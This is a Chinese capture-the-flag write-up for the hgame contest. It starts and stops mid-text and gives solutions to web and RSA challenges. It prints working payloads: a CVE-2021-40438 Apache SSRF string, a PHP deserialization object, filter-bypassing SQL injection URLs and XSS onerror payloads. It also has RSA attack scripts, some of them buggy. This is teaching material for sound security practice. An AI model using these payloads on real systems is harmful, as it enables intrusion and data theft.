&#x3D; url + key print(url) r &#x3D; requests.get(url&#x3D;url) # if &#39;href&#39; in r.text: print(r.text) lstNew &#x3D; r.text if &#39;href&#39; in lstNew: start &#x3D; lstNew.find(&quot;href&#x3D;\\&quot;?&quot;) print(start) end &#x3D; lstNew.find(&quot;D\\&quot;&gt;点我试试&quot;) print(end) length &#x3D; len(&quot;href&#x3D;\\&quot;&quot;) l &#x3D; lstNew[start + length:end +1] key &#x3D; l print(key) if key &#x3D;&#x3D; &#39;&#39;: break sleep(0.5) if &quot;hgame&#123;&quot; in r.text: print(r.text) break else: print(r.text) break 写的脚本（好拉的编程 跑到第100关后在响应头里找 Tetris plus源码里直接找 Fujiwara Tofu Shop 先加个referer头为qiumingshan.net 然后改ua 再改cookie flavor = Raspberry 然后再加上一个Gasoline:100 再是要求本地登录，但是过滤了xff，换个头就行 IOT饭卡的uno不会iot，但是这个把附件拖了ida里就能看见flag CRYPTOEasy RSA已知p，q，e和密文求明文的rsa import libnum from Crypto.Util.number import long_to_bytes string &#x3D; &#39;&#39; flag &#x3D; [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)] for x in range(38): c &#x3D; flag[x][3] q &#x3D; flag[x][2] p &#x3D; flag[x][1] n &#x3D; p*q e &#x3D; flag[x][0] d &#x3D; libnum.invmod(e, (p - 1) * (q - 1)) m &#x3D; pow(c, d, n) string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;) print(string) English Novel给了四个文件，一个小说原文，一个加密后的小说，一个加密脚本，一个flag密文 先根据小说原文里的标点通过Linux的grep命令看一下相对的密文 再根据加密脚本逆向写出求key的脚本，然后是求密文（真的好拉的编程 def encrypt(data, key): # assert len(data) &lt;&#x3D; len(key) result &#x3D; &quot;&quot; for i in range(len(data)): if data[i].isupper(): result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) elif data[i].islower(): result +&#x3D; chr((ord(data[i]) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;)) else: result +&#x3D; data[i] return result def decrypt(result, key): # assert len(data) &lt;&#x3D; len(key) data &#x3D; &quot;&quot; for i in range(len(result)): if result[i].isupper(): #result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) for k in range(65,90):#python这个对负数求余真不知道怎么逆了，只能爆破了 result1 &#x3D; chr((k - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) if result1 &#x3D;&#x3D; result[i]: data +&#x3D; chr(k) elif result[i].islower(): for k in range(96,123): result1 &#x3D; chr((ord(chr(k)) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;)) if result1 &#x3D;&#x3D; result[i]: data +&#x3D; chr(k) else: data +&#x3D; result[i] print(data) def decryptkey(data1, result1): keyboard &#x3D; [] for n in range(25): for i in range(len(data1)): if data[i].isupper(): # result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) key &#x3D; str((ord(result1[i]) - ord(&#39;A&#39;) + (26 * n)) + ord(&#39;A&#39;) - ord(data1[i])) keyboard.append(key) elif data[i].islower(): key &#x3D; str((ord(result1[i]) - ord(&#39;a&#39;) + (26 * n)) + ord(&#39;a&#39;) - ord(data1[i])) keyboard.append(key) else: key &#x3D; 0 keyboard.append(key) n &#x3D; str(n) for i in keyboard: print(i, end&#x3D;&#39;,&#39;) print(&#39;&#x2F;n&#39;) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: data &#x3D; &quot;&quot;&quot;urveying the ground, Snowball declared that this was just the place for a windmill&quot;&quot;&quot;#这里写原文 result &#x3D; &quot;klsyf&#123;W0_j0v_ca0z_&#39;Ks0ao-bln1qstxp_juqfqy&#39;?&#125;&quot;#这里写密文 a &#x3D; [3, 5, -8, 12, 1, -2, -7, 10, 0, -15, 1, 1, 0, 18, -13, -7, 3, 12, 20, 0, 0, -16, 4, 1, -17, 12, 0, 13, -4, 0, -1, 15, 0, -4, 25, -17, 1, -3, 0, -12, 14, 3, 3, 0, 0, 8, -8, 6, 0, 0, 21, 7, 0, -5, -20, -6, -17, 0, -6, 13, 8, 0,2, 1, 20, 20, -1, 0, 16, -10, -1, 0, 21, 0, -6, -5, 9, 18, 10, 16, 10, 5, 0, 0, 0, 6, -8, -1, 7, 0, 20, 9, 2, 3, -3] #decryptkey(data, result) decrypt(result, a) #print(encrypt(data, a)) 这个flag在单引号里边的部分还是有点问题，可能是因为key的关系，但是由attfck能猜出attack，由pla1qtext能猜出plaintext，然后改完之后搜一下 最终flag hgame{D0_y0u_kn0w_&#39;Kn0wn-pla1ntext_attack&#39;?} 第二周wpWEBApache!*有备份文件 根据题目描述应该是ssrf漏洞，结合apache版本能搜到CVE-2021-40438 ?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:&#x2F;&#x2F;internal.host&#x2F; 但是网上的 exp 大多是 Apache 直接作为代理服务器的情况，这题给了 Apache 的配置文件 https-vhosts.conf , &#39;/&#39; 提供静态资源服务， &#39;/proxy&#39; 提供代理服务。 所以要在/proxy路径下用payload webpack-engine 看源码，两次base64解码得到flag hgame&#123;D0nt_f0r9et_2_ClOs3_S0urce_m@p&#125; 一本单词书看源码有www.zip的提示 代码审计一下 简单的用户判断 绕过之后 看index.php 大致逻辑就是将输入的传入get.php和save.php进行处理 save.php 将传入的单词的key和value写入文件中，并利用|来将key和value的序列化之后的值分隔。 get.php 读取save.php中创建的文件的内容 evil.php 看见wakeup方法，再联系get.php时的unserialize可以猜测这里是要利用反序列化让file=/flag然后令flag变量的值变为flag再利用get.php将其读出来 这里要注意序列化的内容要在填在单词的位置，将其作为数组的key而不是value，否则在encode函数时会对value再进行一次序列化导致payload改变，无法执行反序列化操作 还要在反序列化的payload前添加|符号 让|后的部分执行decode函数中的反序列化 将evil类中的file赋值为/flag，从而让flag=/flag文件中的内容 这里的if过滤没啥用 最终payload &#123;|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;N;&#125; Pokemon 开始页面，源码里提示了个index?id=1 输到url上能看出来id的数决定了出现的是哪个精灵 当id不是1，2，3其中的数时会跳转到error.php 刚开始感觉是sql注入，注了半天这个页面没报错，这里id的值感觉是通过php的弱比较来判断的，开始怀疑是不是别的漏洞。 扫了一下扫到了db.php才确定就是sql注入 于是尝试在error界面注入 当code不为数字时会出现报错 刚开始没有给源码，试了好几次没试出来怎么注入 主办方给的源码： 有了源码之后就是一个很简单的联合注入了 括号或者/*x*/替代空格，用like替代等于，双写绕过关键字，因为是数字型注入，所以也不需要注释符 爆库名 ?code&#x3D;1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,database() ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere(table_schema)like&#39;pokemon&#39; ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name)like&#39;fllllllllaaaaaag&#39; ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,(flag)frfromom&#x2F;*x*&#x2F;fllllllllaaaaaa At0m的留言板*xss漏洞 说起这个我就想起来b站那次的xss，还有我还没开始的js学习（ 先试一下 &lt;script&gt;alert(1)&lt;&#x2F;script&gt; 确定是xss 然后主办方给了个hint 输出用户留言位置的class标签名为content，然后还有一个用var定义的flag全局变量 为什么同样是两个变量，第一个使用let，而第二个使用var呢？因为使用 var 可 以利用 Object.keys(window) 拿到全局变量 flag 的变量名，而使用let的话无法获取。 也可以直接用Object.values(window)读取这些全局变量的内容，也就是直接获得flag &lt;img src=1 onerror=\"document.getElementsByClassName('content')[0].innerHTML= Object.values(window)\"> 由于提示里这个flag定义在了一个script标签里，我们也可以用document.scripts来读出script标签里的内容 &lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;) [0].innerText&#x3D;document.scripts[0].text;&quot;&gt; CRYPTORSA Attackrsa真是全套脚本就行 加密脚本 from Crypto.Util.number import getPrime from libnum import s2n from secret import flag m &#x3D; s2n(flag) e &#x3D; 65537 p &#x3D; getPrime(80) q &#x3D; getPrime(80) n &#x3D; p * q c &#x3D; pow(m, e, n) print(&quot;e &#x3D;&quot;, e) print(&quot;n &#x3D;&quot;, n) print(&quot;c &#x3D;&quot;, c) 正常的rsa加密，给了e，n，c求m 在线网站分解n得到pq import gmpy2 from libnum import n2s def Decrypt(c, e, p, q): L &#x3D; (p - 1) * (q - 1) d &#x3D; gmpy2.invert(e, L) n &#x3D; p * q m &#x3D; gmpy2.powmod(c, d, n) flag &#x3D; n2s(int(m) print(flag) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: p &#x3D; 715800347513314032483037 q &#x3D; 978782023871716954857211 e &#x3D; 65537 c &#x3D; 122622425510870177715177368049049966519567512708 Decrypt(c, e, p, q) RSA Attack 2加密脚本 import re from math import ceil from Crypto.Util.number import getPrime from libnum import s2n #flag_parts &#x3D; list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) &#x2F; 3)&#125;&#125;&#125;&quot;, flag))) print(&quot;# task1&quot;) m &#x3D; 42949244670170607238949839659191560916635942982341043413490558510 e &#x3D; 65537 p &#x3D; 118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123 q &#x3D; 123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411 r &#x3D; 169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833 n1 &#x3D; p * q c1 &#x3D; pow(m, e, n1) n2 &#x3D; r * q c2 &#x3D; pow(m, e, n2) print(&quot;e &#x3D;&quot;, e) print(&quot;n1 &#x3D;&quot;, n1) print(&quot;c1 &#x3D;&quot;, c1) print(&quot;n2 &#x3D;&quot;, n2) print(&quot;c2 &#x3D;&quot;, c2) print(&quot;# task2&quot;) m &#x3D; 26926584401348540331333678102939069838976561137078484378892509505 e &#x3D; 7 p &#x3D; getPrime(1024) q &#x3D; getPrime(1024) n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537 c &#x3D; pow(m, e, n) print(&quot;e &#x3D;&quot;, e) print(&quot;n &#x3D;&quot;, n) print(&quot;c &#x3D;&quot;, c) print(&quot;# task3&quot;) m &#x3D; flag_parts[2] p &#x3D; getPrime(1024) q &#x3D; getPrime(1024) n &#x3D; p * q e1 &#x3D; getPrime(32) e2 &#x3D; getPrime(32) c1 &#x3D; pow(m, e1, n) c2 &#x3D; pow(m, e2, n) print(&quot;n &#x3D;&quot;, n) print(&quot;e1 &#x3D;&quot;, e1) print(&quot;c1 &#x3D;&quot;, c1) print(&quot;e2 &#x3D;&quot;, e2) print(&quot;c2 &#x3D;&quot;, c2) 将flag分了三段后分别用了不同的加密方式 第一段 代码能看出n1和n2有共同的素因子，那么可以利用欧几里得算法直接将 n1 和 n2 分解。通过欧几里得算法可以直接求出 n1 和 n2 的最大公约数 p: output给了e,n1,n2,c1,c2 def gcd(a, b): if a &lt; b: a, b &#x3D; b, a while b !&#x3D; 0: temp &#x3D; a % b a &#x3D; b b &#x3D; temp return a def gcd_digui(a, b): if b !&#x3D; 0: return a return gcd(b, a % b) n1 &#x3D; 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553 n2 &#x3D; 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363 p &#x3D; gcd(n1, n2) q &#x3D; n1&#x2F;&#x2F;p r &#x3D; n2&#x2F;&#x2F;p print(p) print(q) print(r) p&#x3D;123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411 q&#x3D;118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123 r&#x3D;169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833 这就相当于有了enc，带到前一个题的代码里得到 hgame{RsA@hAS!a&amp;VArIETY?of. 第二段 e=7像低加密指数分解攻击，直接开七次方 import gmpy2 from libnum import n2s e &#x3D; 7 # 读入 n, 密文 n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537 c &#x3D; 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625 print(&#39;n&#x3D;&#39;, n) print(&#39;c&#x3D;&#39;, c) result &#x3D; gmpy2.iroot(c, 7) print(&#39; [-]The c has cubic root?&#39;, result[1]) if result[1]: print(&#39; [-]The m is:&#39;, &#39;&#123;:x&#125;&#39;.format(result[0])) 得到m = 0x41747461634b5e6d4554686f64535e776841543a6f746865722141 转字符串的为AttacK^mEThodS^whAT:other!A 第三段 共模攻击 from gmpy2 import * from libnum import n2s n &#x3D; 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729 e1 &#x3D; 2519901323 e2 &#x3D; 3676335737 s &#x3D; gcdext(e1, e2) s1 &#x3D; s[1] s2 &#x3D; -s[2] c1 &#x3D; 3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870 c2 &#x3D; 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861 e2 &#x3D; 3676335737 c2 &#x3D; invert(c2, n) m &#x3D; (pow(c1, s1, n) * pow(c2, s2, n)) % n print(m) print(n2s(int(m))) 最终flag hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125; 第三周wpCRYPTO这周密码比上周要简单 Multi Prime RSA加密脚本 给了这除了flag其他的变量都给了 p &#x3D; 61789932148719477384027458333380568978056286136137829092952317307711908353477 q &#x3D; 91207969353355763685633284378833506319794714507027332929290701748727534193861 r &#x3D; 105471299607375388622347272479207944509670502835651250945203397530010861809367 s &#x3D; 83153238748903772448138307505579799277162652151244477391465130504267171881437 n &#x3D; 1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919 e &#x3D; 65537 c &#x3D; 844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713 直接找个rsa的解密脚本带进去就行 RSA Attack 3加密脚本 from Crypto.Util.number import getPrime from gmpy2 import invert from libnum import s2n from secret import flag p &#x3D; getPrime(2048) q &#x3D; getPrime(2048) n &#x3D; p * q d &#x3D; getPrime(64) e &#x3D; invert(d, (p - 1) * (q - 1)) c &#x3D; pow(s2n(flag), e, n) print(f&quot;n &#x3D; &#123;n&#125;&quot;) print(f&quot;e &#x3D; &#123;e&#125;&quot;) print(f&quot;c &#x3D; &#123;c&#125;&quot;) 只给了nec，想要得到明文还要有d，要求d就要指定pq。 利用rsactftool求公钥私钥文件然后得到pq 得到公钥 -----BEGIN PUBLIC KEY----- MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCAgB8YNfjXEOhimdPq0kh+WM0 IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+Gz B13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NW tkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYc BMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;M 